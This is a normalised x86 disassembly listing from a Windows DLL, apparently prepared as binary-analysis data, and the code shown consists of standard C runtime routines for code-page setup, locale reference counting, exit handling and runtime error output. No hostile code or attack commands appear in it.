mov al [ ebp - 0x194 ]
mov ecx [ ebp - 0x1b0 ]
inc [ ebp - 0x1ac ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_1000ce4b
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov [ ebp - 0x194 ] ebx
inc [ ebp - 0x18d ]
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov [ ebp - 0x194 ] eax
movzx eax al
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x194 ] 0x65
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x194 ] eax
mov al [ ebp - 0x1a8 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_1000ce4b
add esp 0xc
test eax eax
je r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_1001227e
pop ecx
pop ecx
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp [ ebp - 0x194 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov [ ebp - 0x185 ] dl
mov dl cl
mov [ ebp - 0x185 ] cl
jmp r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_1000ce4b
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_100096e9
pop ecx
test eax eax
jne r-xdata
movzx ecx [ ebp - 0x185 ]
mov eax ecx
and ecx 0x7
mov dl 0x1
shl dl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] dl
xor dl dl
jmp r-xdata
mov al [ ebp - 0x185 ]
sub al dl
movzx edi dl
movzx edx al
cmp dl [ ebp - 0x185 ]
jae r-xdata
mov eax [ ebp - 0x1b0 ]
inc [ ebp - 0x1cc ]
lea ecx [ ebp - 0x1fc ]
push ecx
push eax
push [ ebp - 0x1c0 ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x185 ]
dec eax
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
add esp 0x10
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov [ ebp - 0x194 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
mov ebx [ ebp - 0x1b4 ]
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_1000ce4b
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1b0 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_1000ce4b
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov [ ebp - 0x194 ] eax
movzx eax al
push eax
call sub_100096e9
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov [ ebp - 0x194 ] eax
and [ ebp - 0x19c ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1b0 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_1000ce4b
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov [ ebp - 0x194 ] eax
movzx eax al
sub_1000e019
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1000e048
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_1000ffa0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1000e0ac
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10012448
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_1000ff1b
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_1000ff1b
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_1000ffa0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_1000e23c
push 0xc
push r--data
call sub_1000f940
call sub_1000bc4d
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_10011e3f
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e2d7
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_1000f985
retn
push 0x20
call sub_1000ee27
cmp esi rw-data
je r-xdata
push esi
call sub_10009957
pop ecx
sub_1000e2e0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_10009611
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000e35c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_1000e2e0
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_1000e048
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000ffa0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1000e019
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_1000e0ac
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000ffa0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1000e019
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_1000e545
push 0x14
push r--data
call sub_1000f940
or [ ebp - 0x20 ] 0xffffffff
call sub_1000bc4d
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1000e23c
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_1000e2e0
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_1000f158
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_1000f985
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1000e35c
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_10009957
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_10009957
pop ecx
push 0xd
call sub_10011e3f
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e6a6
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_10009957
pop ecx
sub_1000e6fd
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1000e78c
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1000e825
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10009957
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10009957
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10009957
push [ esi + 0xc0 ]
call sub_10009957
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10012488
push [ esi + 0xd4 ]
call sub_10009957
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_10009957
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10009957
pop ecx
push [ esi + 0xb0 ]
call sub_10009957
push [ esi + 0xbc ]
call sub_10009957
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10009957
push [ esi + 0xbc ]
call sub_10012868
pop ecx
pop ecx
push eax
call sub_10009957
pop ecx
push eax
call sub_10009957
push [ esi + 0xbc ]
call sub_100127ff
pop ecx
pop ecx
sub_1000e970
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_1000e6fd
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_1000e78c
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1000e825
pop ecx
sub_1000e9bd
push 0xc
push r--data
call sub_1000f940
call sub_1000bc4d
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_10011e3f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_1000e970
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000ea2a
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1000bc4d
mov esi [ eax + 0x6c ]
mov eax esi
call sub_1000f985
retn
push 0x20
call sub_1000ee27
sub_1000ea36
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_10009611
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1001010a
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10012448
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000eaee
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_1000b7fe
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_1000b7fe
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_1000b7ac
mov eax esi
jmp r-xdata
sub_1000eb7f
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1000ebd4
mov edi edi
push esi
call sub_1000ba9d
mov esi eax
push esi
call sub_1000cd82
push esi
call sub_1000b622
push esi
call sub_10012c59
push esi
call sub_10012c4a
push esi
call sub_10012a45
push esi
call sub_10012a34
add esp 0x18
pop esi
retn
sub_1000ec07
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_1000ec2b
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_10011a76
push r--data
push r--data
call sub_1000ec07
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_10012d00
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_1000f90f
call sub_1000cd6b
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_10012d00
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1000ecc2
push 0x20
push r--data
call sub_1000f940
push 0x8
call sub_10011e3f
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000eded
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_1000f985
retn
mov [ rw-data ] 0x1
push 0x8
call sub_10011d66
pop ecx
push [ ebp + 0x8 ]
call sub_1000ebaa
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_1000ba9d
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_1000ba9d
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_1000ee45
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_1000ee6b
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1000ee45
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
push 0x3
call sub_1001306a
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_1001306a
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
